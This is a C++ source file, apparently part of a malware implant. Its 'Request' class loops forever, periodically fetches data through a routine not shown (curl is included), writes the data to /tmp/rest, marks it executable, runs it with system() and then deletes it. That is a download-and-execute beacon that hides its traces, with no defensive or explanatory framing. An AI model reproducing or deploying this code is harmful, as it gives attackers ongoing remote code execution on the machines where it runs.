#include "../../include/target.hpp"
#include <iostream>
#include <fstream>
#include <cstdio>
#include <string>
#include <unistd.h>
#include <curl/curl.h>
#include <sys/stat.h>

using namespace std;
Request::Request()
{
    this->SetDistPath();
    this->srcPath =  "/tmp/rest";
}


int Request::Circle() {
    while (true) {
        sleep(this->duration);
        Request m = Request();
        m.Send();
    }
    return 1;
}

void Request::SetDistPath() {
    this->distPath =  "/tmp/res";
}

int Request::HandleExecute()
{
    string exComStr = this->srcPath;
    int res = system(exComStr.c_str());
    if (res != 0)
    {
        return 1;
    }
    return 0;
}

void Request::WriteResponse(string readBuffer)
{
    ofstream file (this->srcPath, ios::out);
    file << readBuffer;
    file.close();
}

void Request::ChangePerms()
{
    string prComStr = "chmod 744 ";
    string comStr = prComStr + this->srcPath;
    system(comStr.c_str());
}

int Request::Send()
{
    string readBuffer = this->GetData();
    this->WriteResponse(readBuffer);
    this->ChangePerms();
    this->HandleExecute();
    remove(this->srcPath.c_str());
    return 0;
}


